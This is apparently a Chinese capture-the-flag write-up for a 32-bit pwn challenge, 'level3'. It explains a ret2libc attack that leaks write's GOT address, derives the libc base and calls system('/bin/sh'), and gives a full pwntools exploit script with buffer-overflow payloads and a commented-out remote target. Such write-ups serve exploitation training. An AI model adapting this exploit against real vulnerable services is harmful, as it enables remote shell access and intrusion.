# level3 - 远程libc库已知

先用write函数打印出write在got.plt记录的真实地址，回到main函数开头，  

然后用write真实地址减去libc中write的偏移量，得到libc的基址，然后再用libc基址加上system函数和'/bin/sh'的偏移量，等于system和字符串在进程中的真实地址。  

Exp:
```python
import pwn
  
pwn.context(arch='i386', os='linux', log_level='debug')

p = pwn.process('./level3')
#p = pwn.remote('220.249.52.133', 48664)

e = pwn.ELF('./level3')
main_addr = pwn.p32(0x8048484)
write_plt = pwn.p32(e.plt['write'])
write_got = pwn.p32(e.got['write'])

payload1 = b'A' * 0x88 + b'B' * 4 + write_plt + main_addr + pwn.p32(1) + write_got + pwn.p32(4)     # 执行完write函数后回到进程开始处
p.sendlineafter(b'Input:\n', payload1)

write_addr = pwn.u32(p.recv()[0:4])
#libc = pwn.ELF('./libc_32.so.6')        # Remote Libc version
libc = pwn.ELF('/lib32/libc.so.6')     # Local Libc version
libc_addr = write_addr - libc.sym['write']      # libc基址 = write真实地址 - write在libc中的偏移量
system_addr = pwn.p32(libc_addr + libc.sym['system'])   # system真实地址 = libc基址 + system在libc中的偏移量
sh_addr = pwn.p32(libc_addr + next(libc.search(b'/bin/sh')))    # '/bin/sh'真实地址 = libc基址 + 字符串在libc中的偏移量

payload2 = b'A' * 0x88 + b'B' * 4 + system_addr + b'C' * 4 + sh_addr
p.sendline(payload2)

p.interactive()
```